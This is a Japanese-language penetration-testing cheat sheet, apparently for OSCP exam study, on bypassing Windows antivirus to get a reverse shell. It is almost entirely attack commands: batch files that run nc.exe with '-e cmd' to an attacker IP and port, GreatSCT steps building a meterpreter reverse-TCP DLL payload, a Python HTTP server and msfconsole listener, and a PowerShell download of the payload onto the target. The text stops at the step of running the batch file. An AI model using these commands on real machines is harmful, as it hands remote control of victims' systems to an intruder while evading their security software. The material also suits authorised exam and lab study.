
[[Web攻撃の難読化]]
- 参考[HackTricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html?highlight=av#exes-vs-dlls)

# Anti Virus

## Windows

目的：Windowsマシンからリバースシェルを獲得したい。
- EXEよりもDLLが成功確率高い

###### バッチファイル(bat)

```cmd
echo [path to nc.exe] -e cmd [AttackerIP] [Port] > shell.bat
```

バッチファイルで、コマンドの内容を表示せず実行させる
```cmd
@echo off
c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
```

### DLL w/ [GreatSCT](https://github.com/GreatSCT/GreatSCT)

meterpreterシェルを獲得するAV bypassのペイロードを作成する。
（※：MeterpreterはOSCPで1回しか使えない）

#### 攻撃者のマシン

- インストール
```zsh
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
cd ../
sudo ./GreatSCT.py --ip 10.10.14.13 --port 1234 -t bypass -p
regsvcs/meterpreter/rev_tcp.py -o [output file]
```

- ペイロードの作成
```zsh
cd GreatSCT
sudo ./GreatSCT.py --ip [Attacker IP] --port [Port] -t bypass -p
regsvcs/meterpreter/rev_tcp.py -o [Output]
```
出力に、どこに作成されたペイロードが格納されているか、実行する方法（Execute with）などがあるのでよく見ること。

- ペイロードの転送用サーバを立てておく
```zsh
cd [DLL written to:の値で、フォルダまで指定]
sudo python3 -m http.server 80
```

- meterpreterリスナーを開く（sessionは未作成）
```zsh
msfconsole -r [Metasploit RC file written to:の値]
```

#### ペイロード実行先（windowsマシン）

- ペイロードのダウンロード
```cmd
powershell -command Invoke-WebRequest -Uri 'http://[IP]:[Port]/[payload]' -OutFile 'C:\tmep\[payload]'
```

- バッチファイル化
```cmd
cmd /c "echo [Execute with:の値] > C:\Temp\[file].bat"
```

- バッチの実行
